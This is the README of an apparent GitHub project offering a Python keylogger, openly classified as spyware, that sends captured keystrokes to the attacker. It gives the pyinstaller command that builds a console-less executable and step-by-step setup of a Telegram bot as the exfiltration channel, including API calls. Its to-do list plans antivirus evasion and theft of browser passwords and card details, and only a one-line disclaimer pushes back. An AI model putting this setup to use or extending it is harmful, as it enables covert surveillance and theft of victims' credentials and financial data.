# 🔐  keylogger  

`🧠 Key logs are the typed data recorded by a keylogger — basically a “history” of what someone types on their keyboard.
A simple keylogger made in python that send the keystrokes to the attacker's server.`

---  

## 🐼 How It Works  

It capture the Keylogs, store it locally and periodically upload the file to the Server.  


## 🥷 To Do  

- 🔓 To Bypass AntiVirus  
- 🔑 To log the keystrokes of Virtual Keyboard
- 🕵️‍♂️ Capture all sensitive information from the browser (eg: username, password, email, dob, credit card details etc.)
- 🛠️ Capture all actions nd save it in `.log` file
- 📡 This log file sent by my teligram bot in the teligram group where my bot was created


## ⚙️ How to Compile  

__Note:__ Change the __TOKEN__ and __CHAT_ID__ to your Telegram Bot's Token and it's Chat id respectively, also set __INTERVAL__ according to you time requirements before making it executable. (The variables are in Keylogger.py)  
  

Compile the script using __pyinstaller__ to make the executable file.  

```powershell
pyinstaller --noconsole --onefile keylogger.py
```  
---  


## ⚡ Project setup 

### 🔴 Important section 
### (A) Create a Telegram Bot and get a Bot Token

1. Open Telegram application then search for @BotFather
2. Click Start
3. Click Menu -> /newbot or type /newbot and hit Send
4. Follow the instruction until we get message like so
```
      Done! Congratulations on your new bot. You will find it at t.me/new_bot.
      You can now add a description.....

      Use this token to access the HTTP API: 63xxxxxx71:AAFoxxxxn0hwA-2TVSxxxNf4c
      Keep your token secure and store it safely, it can be used by anyone to control your bot.

      For a description of the Bot API, see this page: https://core.telegram.org/bots/api
```
5. So here is our bot token 63xxxxxx71:AAFoxxxxn0hwA-2TVSxxxNf4c (make sure we don't share it to anyone).

### (B) Get Chat ID for a Private Chat

1. Search and open our new Telegram bot
2. Click Start or send a message
3. Open this URL in a browser `https://api.telegram.org/bot{our_bot_token}/getUpdates`
   - See we need to prefix our token with a word bot
   - Eg: `https://api.telegram.org/bot63xxxxxx71:AAFoxxxxn0hwA-2TVSxxxNf4c/getUpdates`
4. We will see a json like so
```
{
  "ok": true,
  "result": [
    {
      "update_id": 83xxxxx35,
      "message": {
        "message_id": 2643,
        "from": {...},
        "chat": {
          "id": 21xxxxx38,
          "first_name": "...",
          "last_name": "...",
          "username": "@username",
          "type": "private"
        },
        "date": 1703062972,
        "text": "/start"
      }
    }
  ]
}
```
5. Check the value of result.0.message.chat.id, and here is our Chat ID: 21xxxxx38
6. Let's try to send a message: `https://api.telegram.org/bot63xxxxxx71:AAFoxxxxn0hwA-2TVSxxxNf4c/sendMessage?chat_id=21xxxxx38&text=Successfully Done`
7. When we set the bot token and chat id correctly, the message test123 should be arrived on our Telegram bot chat.

### (C) Get Chat ID for a Channel

1. Add our Telegram bot into a channel
2. Send a message to the channel
3. Open this URL `https://api.telegram.org/bot{our_bot_token}/getUpdates`
4. We will see a json like so
```
{
  "ok": true,
  "result": [
    {
      "update_id": 838xxxx36,
      "channel_post": {...},
        "chat": {
          "id": -1001xxxxxx062,
          "title": "....",
          "type": "channel"
        },
        "date": 1703065989,
        "text": "test"
      }
    }
  ]
}
```
5. Check the value of result.0.channel_post.chat.id, and here is our Chat ID: -1001xxxxxx062
6. Let's try to send a message: `https://api.telegram.org/bot63xxxxxx71:AAFoxxxxn0hwA-2TVSxxxNf4c/sendMessage?chat_id=-1001xxxxxx062&text=Successfully Done`
7. When we set the bot token and chat id correctly, the message Successfully Done should be arrived on our Telegram channel.

---

## 🐞 Bug  
   
- Feel free to report any Bug  

---  

## 💻 My Set-Up  

* Language Used: __Python3__  
* IDE: __VS Code__  
* OS Used: __Windows 11__    
   
---  

## 🧩 Full Classification

- Category: Malware (Malicious Software)
- Subtype: Spyware
- Specific Type: Keylogger

---

## Sub Division of README.MD
- [Windows](https://github.com/anirbanbanerjee07/Spyware_Keylogger/tree/main/Windows#readme)

## 🤝 Contri
Contributions are always welcome 🔥
* Last Contribution at `7th October 2025` by 🕵️‍♂️ Anirban Banerjee

---

🚫 __Disclamer__: Don't use it to harm other's privacy  

*Code - Coffee - Repeat ☕*

